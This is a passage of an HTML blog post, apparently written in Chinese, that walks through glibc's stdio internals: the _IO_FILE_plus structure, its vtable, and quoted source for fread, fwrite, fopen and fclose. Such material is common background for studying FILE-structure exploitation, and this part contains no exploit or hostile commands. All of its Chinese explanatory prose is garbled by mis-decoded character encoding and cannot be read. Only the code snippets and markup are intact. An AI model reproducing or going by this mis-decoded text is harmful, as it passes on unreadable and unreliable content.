ç±»å‹çš„å…¨å±€å˜é‡ï¼Œåˆ†åˆ«ä»£è¡¨æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰ã€æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å’Œæ ‡å‡†é”™è¯¯ï¼ˆstderrï¼‰ã€‚</li></ul><p>æˆ‘ä»¬å¯ä»¥åœ¨ libc.so ä¸­æ‰¾åˆ° stdin\stdout\stderr ç­‰ç¬¦å·ï¼Œè¿™äº›ç¬¦å·æ˜¯æŒ‡å‘ FILE ç»“æ„çš„æŒ‡é’ˆï¼ŒçœŸæ­£ç»“æ„çš„ç¬¦å·æ˜¯</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412071444828.png" alt="image-20241207144449627"></p><p>æ€»ç»“ï¼š_IO_2_1_stdin_<code>ã€</code>_IO_2_1_stdout_<code>ã€</code>_IO_2_1_stderr_éƒ½ä¸º__IO_FILE_plusç»“æ„ä½“ï¼Œ_IO_FILE_plusåŒ…å«_IO_FILEå’Œ_IO_jump_t</p><p><img src="https://cdn.jsdelivr.net/gh/p0ach1l/Picture/test/202412071507135.png" alt="image-20241207150725087"></p><h2 id="IOå‡½æ•°ä»‹ç»"><a href="#IOå‡½æ•°ä»‹ç»" class="headerlink" title="IOå‡½æ•°ä»‹ç»"></a>IOå‡½æ•°ä»‹ç»</h2><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h3><p>fread æ˜¯æ ‡å‡† IO åº“å‡½æ•°ï¼Œä½œç”¨æ˜¯ä»æ–‡ä»¶æµä¸­è¯»æ•°æ®ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> <span class="hljs-title function_">fread</span> <span class="hljs-params">( <span class="hljs-type">void</span> *buffer, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE *stream)</span> ;<br></code></pre></td></tr></table></figure><ul><li>buffer å­˜æ”¾è¯»å–æ•°æ®çš„ç¼“å†²åŒºã€‚</li><li>sizeï¼šæŒ‡å®šæ¯ä¸ªè®°å½•çš„é•¿åº¦ã€‚</li><li>countï¼š æŒ‡å®šè®°å½•çš„ä¸ªæ•°ã€‚</li><li>streamï¼šç›®æ ‡æ–‡ä»¶æµã€‚</li><li>è¿”å›å€¼ï¼šè¿”å›è¯»å–åˆ°æ•°æ®ç¼“å†²åŒºä¸­çš„è®°å½•ä¸ªæ•°</li></ul><p>fread çš„ä»£ç ä½äº &#x2F; libio&#x2F;iofread.c ä¸­ï¼Œå‡½æ•°åä¸º_IO_freadï¼Œä½†çœŸæ­£çš„åŠŸèƒ½å®ç°åœ¨å­å‡½æ•°_IO_sgetn ä¸­ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_fread (buf, size, count, fp)<br>     <span class="hljs-type">void</span> *buf;<br>     _IO_size_t size;<br>     _IO_size_t count;<br>     _IO_FILE *fp;<br>&#123;<br>  ...<br>  bytes_read = _IO_sgetn (fp, (<span class="hljs-type">char</span> *) buf, bytes_requested);<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨_IO_sgetn å‡½æ•°ä¸­ä¼šè°ƒç”¨_IO_XSGETNï¼Œè€Œ_IO_XSGETN æ˜¯_IO_FILE_plus.vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œåœ¨è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ä¼šé¦–å…ˆå–å‡º vtable ä¸­çš„æŒ‡é’ˆç„¶åå†è¿›è¡Œè°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_size_t<br>_IO_sgetn (fp, data, n)<br>     _IO_FILE *fp;<br>     <span class="hljs-type">void</span> *data;<br>     _IO_size_t n;<br>&#123;<br>  <span class="hljs-keyword">return</span> _IO_XSGETN (fp, data, n);<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨é»˜è®¤æƒ…å†µä¸‹å‡½æ•°æŒ‡é’ˆæ˜¯æŒ‡å‘_IO_file_xsgetn å‡½æ•°çš„ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base<br>        &amp;&amp; want &lt; (<span class="hljs-type">size_t</span>) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))<br>      &#123;<br>        <span class="hljs-keyword">if</span> (__underflow (fp) == EOF)<br>      <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br></code></pre></td></tr></table></figure><h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h3><p>fwrite åŒæ ·æ˜¯æ ‡å‡† IO åº“å‡½æ•°ï¼Œä½œç”¨æ˜¯å‘æ–‡ä»¶æµå†™å…¥æ•°æ®ï¼Œå‡½æ•°åŸå‹å¦‚ä¸‹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">fwrite</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* buffer, <span class="hljs-type">size_t</span> size, <span class="hljs-type">size_t</span> count, FILE* stream)</span></span>;<br></code></pre></td></tr></table></figure><ul><li>buffer: æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œå¯¹ fwrite æ¥è¯´ï¼Œæ˜¯è¦å†™å…¥æ•°æ®çš„åœ°å€;</li><li>size: è¦å†™å…¥å†…å®¹çš„å•å­—èŠ‚æ•°;</li><li>count: è¦è¿›è¡Œå†™å…¥ size å­—èŠ‚çš„æ•°æ®é¡¹çš„ä¸ªæ•°;</li><li>stream: ç›®æ ‡æ–‡ä»¶æŒ‡é’ˆ;</li><li>è¿”å›å€¼ï¼šå®é™…å†™å…¥çš„æ•°æ®é¡¹ä¸ªæ•° countã€‚</li></ul><p>fwrite çš„ä»£ç ä½äº &#x2F; libio&#x2F;iofwrite.c ä¸­ï¼Œå‡½æ•°åä¸º_IO_fwriteã€‚ åœ¨_IO_fwrite ä¸­ä¸»è¦æ˜¯è°ƒç”¨_IO_XSPUTN æ¥å®ç°å†™å…¥çš„åŠŸèƒ½ã€‚</p><p>æ ¹æ®å‰é¢å¯¹_IO_FILE_plus çš„ä»‹ç»ï¼Œå¯çŸ¥_IO_XSPUTN ä½äº_IO_FILE_plus çš„ vtable ä¸­ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°éœ€è¦é¦–å…ˆå–å‡º vtable ä¸­çš„æŒ‡é’ˆï¼Œå†è·³è¿‡å»è¿›è¡Œè°ƒç”¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_fwrite (<span class="hljs-type">const</span> <span class="hljs-type">void</span> *buf, _IO_size_t size, _IO_size_t count, _IO_FILE *fp)<br>&#123;<br>  _IO_size_t request = size * count;<br>  _IO_size_t written = <span class="hljs-number">0</span>;<br>  CHECK_FILE (fp, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (request == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  _IO_acquire_lock (fp);<br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span> || _IO_fwide (fp, <span class="hljs-number">-1</span>) == <span class="hljs-number">-1</span>)<br>    written = _IO_sputn (fp, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) buf, request);<br>  _IO_release_lock (fp);<br>  <span class="hljs-comment">/* We have written all of the input in case the return value indicates</span><br><span class="hljs-comment">     this or EOF is returned.  The latter is a special case where we</span><br><span class="hljs-comment">     simply did not manage to flush the buffer.  But the data is in the</span><br><span class="hljs-comment">     buffer and therefore written as far as fwrite is concerned.  */</span><br>  <span class="hljs-keyword">if</span> (written == request || written == EOF)<br>    <span class="hljs-keyword">return</span> count;<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> written / size;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨_IO_XSPUTN å¯¹åº”çš„é»˜è®¤å‡½æ•°_IO_new_file_xsputn ä¸­ä¼šè°ƒç”¨åŒæ ·ä½äº vtable ä¸­çš„_IO_OVERFLOW</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Next flush the (full) buffer. */</span><br>     <span class="hljs-keyword">if</span> (_IO_OVERFLOW (f, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>_IO_OVERFLOW é»˜è®¤å¯¹åº”çš„å‡½æ•°æ˜¯_IO_new_file_overflow</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (ch == EOF)<br>    <span class="hljs-keyword">return</span> _IO_do_write (f, f-&gt;_IO_write_base,<br>             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);<br>  <span class="hljs-keyword">if</span> (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) <span class="hljs-comment">/* Buffer is really full */</span><br>    <span class="hljs-keyword">if</span> (_IO_do_flush (f) == EOF)<br>      <span class="hljs-keyword">return</span> EOF;<br></code></pre></td></tr></table></figure><p>åœ¨_IO_new_file_overflow å†…éƒ¨æœ€ç»ˆä¼šè°ƒç”¨ç³»ç»Ÿæ¥å£ write å‡½æ•°</p><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h3><p>å‡½æ•°åŸå‹å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">(<span class="hljs-type">char</span> *filename, *type)</span>;<br></code></pre></td></tr></table></figure><ul><li>filename: ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„</li><li>type: æ‰“å¼€æ–¹å¼çš„ç±»å‹</li><li>è¿”å›å€¼: è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ</li></ul><p>fopen åœ¨æ ‡å‡† IO åº“ä¸­ç”¨äºæ‰“å¼€æ–‡ä»¶ï¼Œæºç å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_FILE *<br>__fopen_maybe_mmap (_IO_FILE *fp)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _G_HAVE_MMAP</span><br>  <span class="hljs-keyword">if</span> ((fp-&gt;_flags2 &amp; _IO_FLAGS2_MMAP) &amp;&amp; (fp-&gt;_flags &amp; _IO_NO_WRITES))<br>    &#123;<br>      <span class="hljs-comment">/* Since this is read-only, we might be able to mmap the contents</span><br><span class="hljs-comment"> directly.  We delay the decision until the first read attempt by</span><br><span class="hljs-comment"> giving it a jump table containing functions that choose mmap or</span><br><span class="hljs-comment"> vanilla file operations and reset the jump table accordingly.  */</span><br><br>      <span class="hljs-keyword">if</span> (fp-&gt;_mode &lt;= <span class="hljs-number">0</span>)<br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_file_jumps_maybe_mmap;<br>      <span class="hljs-keyword">else</span><br>_IO_JUMPS_FILE_plus (fp) = &amp;_IO_wfile_jumps_maybe_mmap;<br>      fp-&gt;_wide_data-&gt;_wide_vtable = &amp;_IO_wfile_jumps_maybe_mmap;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">return</span> fp;<br>&#125;<br><br><br>_IO_FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>  _IO_file_init (&amp;new_f-&gt;fp);<br><span class="hljs-meta">#<span class="hljs-keyword">if</span>  !_IO_UNIFIED_JUMPTABLES</span><br>  new_f-&gt;fp.vtable = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>_IO_FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>strong_alias (_IO_new_fopen, __new_fopen)<br>versioned_symbol (libc, _IO_new_fopen, _IO_fopen, GLIBC_2_1);<br>versioned_symbol (libc, __new_fopen, fopen, GLIBC_2_1);<br><br><span class="hljs-meta"># <span class="hljs-keyword">if</span> !defined O_LARGEFILE || O_LARGEFILE == 0</span><br>weak_alias (_IO_new_fopen, _IO_fopen64)<br>weak_alias (_IO_new_fopen, fopen64)<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br></code></pre></td></tr></table></figure><ul><li>filename: ç›®æ ‡æ–‡ä»¶çš„è·¯å¾„</li><li>type: æ‰“å¼€æ–¹å¼çš„ç±»å‹</li><li>è¿”å›å€¼: è¿”å›ä¸€ä¸ªæ–‡ä»¶æŒ‡é’ˆ</li></ul><p>åœ¨ fopen å†…éƒ¨ä¼šåˆ›å»º FILE ç»“æ„å¹¶è¿›è¡Œä¸€äº›åˆå§‹åŒ–æ“ä½œï¼Œä¸‹é¢æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹</p><p>é¦–å…ˆåœ¨ fopen å¯¹åº”çš„å‡½æ•°__fopen_internal å†…éƒ¨ä¼šè°ƒç”¨ malloc å‡½æ•°ï¼Œåˆ†é… FILE ç»“æ„çš„ç©ºé—´ã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥è·çŸ¥ FILE ç»“æ„æ˜¯å­˜å‚¨åœ¨å †ä¸Šçš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">*new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br></code></pre></td></tr></table></figure><p>ä¹‹åä¼šä¸ºåˆ›å»ºçš„ FILE åˆå§‹åŒ– vtableï¼Œå¹¶è°ƒç”¨_IO_file_init è¿›ä¸€æ­¥åˆå§‹åŒ–æ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>_IO_file_init (&amp;new_f-&gt;fp);<br></code></pre></td></tr></table></figure><p>åœ¨_IO_file_init å‡½æ•°çš„åˆå§‹åŒ–æ“ä½œä¸­ï¼Œä¼šè°ƒç”¨_IO_link_in æŠŠæ–°åˆ†é…çš„ FILE é“¾å…¥_IO_list_all ä¸ºèµ·å§‹çš„ FILE é“¾è¡¨ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>_IO_link_in (fp)<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> *<span class="hljs-title">fp</span>;</span><br>&#123;<br>    <span class="hljs-keyword">if</span> ((fp-&gt;file._flags &amp; _IO_LINKED) == <span class="hljs-number">0</span>)<br>    &#123;<br>      fp-&gt;file._flags |= _IO_LINKED;<br>      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;<br>      _IO_list_all = fp;<br>      ++_IO_list_all_stamp;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹‹å__fopen_internal å‡½æ•°ä¼šè°ƒç”¨_IO_file_fopen å‡½æ•°æ‰“å¼€ç›®æ ‡æ–‡ä»¶ï¼Œ_IO_file_fopen ä¼šæ ¹æ®ç”¨æˆ·ä¼ å…¥çš„æ‰“å¼€æ¨¡å¼è¿›è¡Œæ‰“å¼€æ“ä½œï¼Œæ€»ä¹‹æœ€åä¼šè°ƒç”¨åˆ°ç³»ç»Ÿæ¥å£ open å‡½æ•°ï¼Œè¿™é‡Œä¸å†æ·±å…¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹ fopen çš„æ“ä½œæ˜¯</p><ul><li>ä½¿ç”¨ malloc åˆ†é… FILE ç»“æ„</li><li>è®¾ç½® FILE ç»“æ„çš„ vtable</li><li>åˆå§‹åŒ–åˆ†é…çš„ FILE ç»“æ„</li><li>å°†åˆå§‹åŒ–çš„ FILE ç»“æ„é“¾å…¥ FILE ç»“æ„é“¾è¡¨ä¸­</li><li>è°ƒç”¨ç³»ç»Ÿè°ƒç”¨æ‰“å¼€æ–‡ä»¶</li></ul><h3 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h3><p>fclose æ˜¯æ ‡å‡† IO åº“ä¸­ç”¨äºå…³é—­å·²æ‰“å¼€æ–‡ä»¶çš„å‡½æ•°ï¼Œå…¶ä½œç”¨ä¸ fopen ç›¸åã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">fclose</span><span class="hljs-params">(FILE *stream)</span><br></code></pre></td></tr></table></figure><p>åŠŸèƒ½ï¼šå…³é—­ä¸€ä¸ªæ–‡ä»¶æµï¼Œä½¿ç”¨ fclose å°±å¯ä»¥æŠŠç¼“å†²åŒºå†…æœ€åå‰©ä½™çš„æ•°æ®è¾“å‡ºåˆ°ç£ç›˜æ–‡ä»¶ä¸­ï¼Œå¹¶é‡Šæ”¾æ–‡ä»¶æŒ‡é’ˆå’Œæœ‰å…³çš„ç¼“å†²åŒº</p><p>å‡½æ•°æºç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_new_fclose (_IO_FILE *fp)<br>&#123;<br>  <span class="hljs-type">int</span> status;<br><br>  CHECK_FILE(fp, EOF);<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)</span><br>  <span class="hljs-comment">/* We desperately try to help programs which are using streams in a</span><br><span class="hljs-comment">     strange way and mix old and new functions.  Detect old streams</span><br><span class="hljs-comment">     here.  */</span><br>  <span class="hljs-keyword">if</span> (_IO_vtable_offset (fp) != <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> _IO_old_fclose (fp);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-comment">/* First unlink the stream.  */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br><br>  _IO_acquire_lock (fp);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it (fp);<br>  <span class="hljs-keyword">else</span><br>    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="hljs-number">-1</span> : <span class="hljs-number">0</span>;<br>  _IO_release_lock (fp);<br>  _IO_FINISH (fp);<br>  <span class="hljs-keyword">if</span> (fp-&gt;_mode &gt; <span class="hljs-number">0</span>)<br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">if</span> _LIBC</span><br>      <span class="hljs-comment">/* This stream has a wide orientation.  This means we have to free</span><br><span class="hljs-comment"> the conversion functions.  */</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *<span class="hljs-title">cc</span> =</span> fp-&gt;_codecvt;<br><br>      __libc_lock_lock (__gconv_lock);<br>      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);<br>      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);<br>      __libc_lock_unlock (__gconv_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    &#125;<br>  <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>_IO_free_backup_area (fp);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)<br>    &#123;<br>      fp-&gt;_IO_file_flags = <span class="hljs-number">0</span>;<br>      <span class="hljs-built_in">free</span>(fp);<br>    &#125;<br><br>  <span class="hljs-keyword">return</span> status;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _LIBC</span><br>versioned_symbol (libc, _IO_new_fclose, _IO_fclose, GLIBC_2_1);<br>strong_alias (_IO_new_fclose, __new_fclose)<br>versioned_symbol (libc, __new_fclose, fclose, GLIBC_2_1);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>fclose é¦–å…ˆä¼šè°ƒç”¨_IO_unlink_it å°†æŒ‡å®šçš„ FILE ä»_chain é“¾è¡¨ä¸­è„±é“¾</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    _IO_un_link ((<span class="hljs-keyword">struct</span> _IO_FILE_plus *) fp);<br></code></pre></td></tr></table></figure><p>ä¹‹åä¼šè°ƒç”¨_IO_file_close_it å‡½æ•°ï¼Œ_IO_file_close_it ä¼šè°ƒç”¨ç³»ç»Ÿæ¥å£ close å…³é—­æ–‡ä»¶</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)<br>    status = _IO_file_close_it 